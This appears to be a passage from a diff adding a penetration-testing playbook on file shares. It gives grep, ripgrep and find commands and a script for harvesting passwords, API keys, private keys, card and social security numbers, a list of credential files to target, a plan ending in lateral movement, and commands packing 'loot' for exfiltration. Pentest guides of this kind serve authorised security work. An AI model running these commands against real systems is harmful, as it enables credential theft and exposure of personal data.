+- ack
+- ripgrep (rg)
+- parallel
+- locate
+
+**Steps/Commands:**
+```bash
+# Basic grep for passwords
+grep -r -i "password" /mnt/share/ 2>/dev/null
+grep -r -i -E "pass.*=|pwd.*=|password.*:" /mnt/share/ 2>/dev/null
+
+# Grep with context
+grep -r -i -A 3 -B 3 "password" /mnt/share/ 2>/dev/null
+
+# Multiple patterns
+grep -r -i -E "password|credential|secret|token|apikey|api_key" /mnt/share/ 2>/dev/null
+
+# Exclude binary files
+grep -r -I -i "password" /mnt/share/ 2>/dev/null
+
+# Only specific file types
+grep -r -i --include="*.txt" --include="*.conf" --include="*.config" "password" /mnt/share/
+
+# Find specific file types first, then grep
+find /mnt/share -type f \( -name "*.conf" -o -name "*.txt" -o -name "*.xml" \) -exec grep -l "password" {} \;
+
+# Using ripgrep (much faster)
+rg -i "password" /mnt/share/
+rg -i -t txt -t conf "password" /mnt/share/
+rg -i -g "*.{txt,conf,xml}" "password" /mnt/share/
+
+# Using ack
+ack -i "password" /mnt/share/
+ack -i --type=text "password" /mnt/share/
+
+# Parallel grep for speed
+find /mnt/share -type f -name "*.txt" | parallel -j 10 grep -l "password" {}
+
+# Common sensitive patterns
+# Passwords
+grep -r -E "(password|passwd|pwd)\s*[:=]\s*['\"]?[^'\"]*['\"]?" /mnt/share/
+# API keys
+grep -r -E "(api[_\s]?key|apikey)\s*[:=]\s*['\"]?[A-Za-z0-9]{20,}['\"]?" /mnt/share/
+# Private keys
+grep -r "BEGIN RSA PRIVATE KEY" /mnt/share/
+# AWS keys
+grep -r -E "AKIA[A-Z0-9]{16}" /mnt/share/
+# URLs with credentials
+grep -r -E "https?://[^:]+:[^@]+@" /mnt/share/
+
+# Database connection strings
+grep -r -E "(mysql|postgresql|mongodb|redis)://.*@" /mnt/share/
+grep -r -i "Data Source=.*;.*Password=" /mnt/share/
+
+# Credit card patterns
+grep -r -E "[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}" /mnt/share/
+
+# Social Security Numbers
+grep -r -E "[0-9]{3}-[0-9]{2}-[0-9]{4}" /mnt/share/
+
+# Email addresses
+grep -r -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" /mnt/share/
+
+# IP addresses
+grep -r -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /mnt/share/
+
+# Base64 encoded data
+grep -r -E "[A-Za-z0-9+/]{40,}={0,2}" /mnt/share/
+
+# Hashes
+grep -r -E "[a-f0-9]{32}" /mnt/share/  # MD5
+grep -r -E "[a-f0-9]{40}" /mnt/share/  # SHA1
+grep -r -E "[a-f0-9]{64}" /mnt/share/  # SHA256
+
+# Create comprehensive search script
+cat > search_share.sh << 'EOF'
+#!/bin/bash
+SHARE_PATH=$1
+OUTPUT_DIR="./search_results"
+mkdir -p $OUTPUT_DIR
+
+echo "[*] Searching for passwords..."
+rg -i "password|passwd|pwd" "$SHARE_PATH" > "$OUTPUT_DIR/passwords.txt" 2>/dev/null
+
+echo "[*] Searching for API keys..."
+rg -i "api.?key|token|secret" "$SHARE_PATH" > "$OUTPUT_DIR/api_keys.txt" 2>/dev/null
+
+echo "[*] Searching for private keys..."
+rg "BEGIN.*PRIVATE KEY" "$SHARE_PATH" > "$OUTPUT_DIR/private_keys.txt" 2>/dev/null
+
+echo "[*] Searching for database connections..."
+rg -i "mysql://|postgresql://|mongodb://|Data Source=" "$SHARE_PATH" > "$OUTPUT_DIR/db_connections.txt" 2>/dev/null
+
+echo "[*] Searching for AWS keys..."
+rg "AKIA[A-Z0-9]{16}" "$SHARE_PATH" > "$OUTPUT_DIR/aws_keys.txt" 2>/dev/null
+
+echo "[*] Finding interesting files..."
+find "$SHARE_PATH" -type f \( -name "*.kdbx" -o -name "*.key" -o -name "*.pem" -o -name "id_rsa*" -o -name "*.ovpn" \) > "$OUTPUT_DIR/interesting_files.txt" 2>/dev/null
+
+echo "[*] Results saved to $OUTPUT_DIR"
+EOF
+chmod +x search_share.sh
+
+# Find recently modified files
+find /mnt/share -type f -mtime -7 -ls  # Modified in last 7 days
+find /mnt/share -type f -mmin -60 -ls  # Modified in last hour
+
+# Find large files
+find /mnt/share -type f -size +100M -ls
+find /mnt/share -type f -name "*.bak" -size +10M -ls
+
+# Find by permissions
+find /mnt/share -type f -perm 777 -ls
+find /mnt/share -type f -perm /u+s -ls  # SUID files
+
+# Quick file type statistics
+find /mnt/share -type f | sed 's/.*\.//' | sort | uniq -c | sort -rn | head -20
+
+# Count total files
+find /mnt/share -type f | wc -l
+
+# Generate file listing for offline analysis
+find /mnt/share -type f -ls > file_listing.txt
+find /mnt/share -type f -name "*" -exec ls -la {} \; > detailed_listing.txt
+```
+
+**Pitfalls:**
+- Performance on large shares
+- Binary files false positives
+- Case sensitivity issues
+- Recursive search depth
+- Memory consumption
+
+**Cleanup Steps:**
+```bash
+# Remove search results
+rm -rf search_results/
+rm file_listing.txt
+```
+
+**Suggested Findings:**
+- Hardcoded passwords
+- API keys in code
+- Sensitive data patterns
+- Unencrypted PII
+- Credential patterns
+
+**Conditions When to Try:**
+- Large file shares
+- Code repositories
+- Document stores
+- Log directories
+
+---
+
+## 9. Quick Reference - Priority Files to Look For
+
+**Category:** Quick Wins  
+**Description:** Prioritized list of files to search for immediate value.
+
+**Critical Files - Check First:**
+```bash
+# Password stores
+*.kdbx           # KeePass
+*.psafe3         # Password Safe
+*.1pif           # 1Password
+*.agilekeychain  # 1Password
+*wallet*         # Various wallets
+
+# SSH keys
+id_rsa*
+id_dsa*
+id_ecdsa*
+id_ed25519*
+*.ppk            # PuTTY
+*.key
+*.pem
+
+# Certificates
+*.p12
+*.pfx
+*.crt
+*.cer
+
+# Configs with passwords
+web.config
+wp-config.php
+config.php
+*.env
+.htpasswd
+*.ini
+*.conf
+*.cfg
+
+# Database files
+*.db
+*.sqlite*
+*.mdb
+*.sql
+
+# Backup files
+*.bak
+*.backup
+*.old
+*.orig
+~*               # Temp files
+
+# VPN configs
+*.ovpn
+*.pcf
+
+# Cloud credentials
+credentials      # AWS
+.azure/*
+.gcp/*
+.aws/*
+
+# History files
+.bash_history
+.zsh_history
+.mysql_history
+.psql_history
+
+# Network configs
+*.pcap
+*.cap
+running-config
+startup-config
+```
+
+**Quick Search Commands:**
+```bash
+# One-liner to find all interesting files
+find /mnt/share -type f \( \
+    -name "*.kdbx" -o \
+    -name "id_rsa*" -o \
+    -name "*.key" -o \
+    -name "*.pem" -o \
+    -name "*.p12" -o \
+    -name "*.pfx" -o \
+    -name "web.config" -o \
+    -name "wp-config.php" -o \
+    -name "*.env" -o \
+    -name ".htpasswd" -o \
+    -name "*.ovpn" -o \
+    -name "*password*" -o \
+    -name "*credential*" -o \
+    -name "*.bak" -o \
+    -name "*.sql" \
+\) 2>/dev/null
+
+# Quick grep for passwords
+grep -r -i -I -m 1 --include="*.txt" --include="*.conf" --include="*.config" --include="*.xml" --include="*.ini" --include="*.php" --include="*.asp*" "password\|pwd\|passwd" /mnt/share/ 2>/dev/null | head -50
+```
+
+---
+
+## Final Notes
+
+### File Share Exploitation Strategy
+1. **Enumerate** - Identify all accessible shares
+2. **Browse** - Map share structure and permissions  
+3. **Search** - Look for sensitive files and patterns
+4. **Extract** - Download interesting files
+5. **Analyze** - Crack passwords, explore databases
+6. **Exploit** - Use found credentials for lateral movement
+
+### Performance Tips
+- Use `ripgrep` or `ag` instead of `grep` for large shares
+- Mount shares locally for faster searching
+- Create file listings first, search offline
+- Use parallel processing when possible
+- Exclude binary files from text searches
+
+### Data Exfiltration
+```bash
+# Compress before download
+tar -czf loot.tar.gz /mnt/share/sensitive/
+# Split large files
+split -b 100M loot.tar.gz loot.part.
+# Encrypted archive
+7z a -p<PASSWORD> -mhe=on loot.7z /mnt/share/sensitive/
+```
+
+### Legal and Ethical Notes
+- Only access authorized shares
+- Document all files accessed
+- Report sensitive findings immediately
+- Don't modify/delete files unless authorized
+- Follow data handling procedures
+- Respect privacy and confidentiality
+
+### Useful Resources
+- GTFOBins: https://gtfobins.github.io/
+- CrackStation: https://crackstation.net/
+- HashKiller: https://hashkiller.io/
+- PayloadAllTheThings: GitHub repo with patterns
